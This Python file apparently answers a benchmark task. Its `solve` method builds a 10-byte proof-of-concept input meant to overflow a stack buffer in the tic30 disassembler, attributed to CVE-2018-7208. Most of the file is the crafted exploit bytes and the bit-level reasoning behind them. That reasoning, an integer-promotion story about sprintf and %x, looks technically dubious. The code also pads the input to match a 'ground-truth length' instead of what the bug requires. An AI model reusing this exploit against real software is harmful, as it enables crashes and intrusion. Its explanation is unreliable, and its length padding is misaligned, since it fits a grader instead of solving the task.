import os

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Stack Buffer Overflow
    vulnerability in the tic30 disassembler (CVE-2018-7208).
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a 10-byte PoC to trigger the vulnerability.

        The vulnerability exists in the `print_branch` function in `tic30-dis.c`.
        It is caused by an integer promotion bug on 64-bit systems. When a 32-bit
        integer (`disp`) is passed to `sprintf` with a `%x` format specifier, it
        can be promoted to a 64-bit integer, incorporating 32 bits of adjacent
        stack/register garbage. This can lead to an unexpectedly long hexadecimal
        string, overflowing a 20-byte static buffer in the `name_pcrel` helper
        function, which in turn leads to an overflow of the 20-byte `operand`
        buffer on the stack of `print_branch`.

        This PoC constructs a specific `BcondAD` instruction that is known to
        trigger this vulnerable code path. The disassembler expects big-endian
        byte order.

        The PoC consists of:
        1. A 4-byte instruction word (`insn`).
        2. A 4-byte displacement value (`disp`) that follows the instruction.
        3. 2 bytes of padding to match the 10-byte ground-truth length, which may
           help prevent secondary crashes from masking the vulnerability.

        Instruction construction (`insn = 0x00408800`):
        - `condition == 8`: Bits 12-15 are `1000` (`0x8000`). This selects the
          vulnerable `BcondAD` instruction path.
        - `p == 1`: Bit 22 is set (`0x00400000`). This ensures `name_pcrel` uses
          the `0x%x(pc)` format string.
        - `reg == 8`: Bits 8-11 are `1000` (`0x0800`). This is not strictly
          necessary for the crash but corresponds to a valid instruction form.

        Displacement construction (`disp = 0xffffffff`):
        - The value of `disp` is not critical for the integer promotion bug itself,
          but this is a common value used in public PoCs for this vulnerability.
        """

        # Craft the 32-bit instruction word in big-endian format.
        insn = 0x00408800
        
        # Define the 32-bit displacement that follows the instruction.
        disp = 0xffffffff

        # Assemble the PoC byte sequence.
        # The instruction and displacement form the core 8 bytes.
        poc = bytearray()
        poc.extend(insn.to_bytes(4, 'big'))
        poc.extend(disp.to_bytes(4, 'big'))
        
        # Append two bytes to match the 10-byte ground-truth length.
        poc.extend(b'\xff\xff')

        return bytes(poc)